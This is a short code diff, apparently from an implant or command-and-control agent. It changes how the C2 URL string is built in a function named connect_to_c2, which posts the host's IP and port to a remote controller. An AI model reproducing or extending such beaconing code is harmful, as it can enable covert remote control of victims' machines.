@@ -59,7 +59,7 @@ def get_platform_info():
 def connect_to_c2():
     try:
         resp = rq.post(
-            config['c2url'] + "/environments",
+            f"{config['c2url']}/environments",
             json={
                 'ip': config['ip'],
                 'port': config['port'],
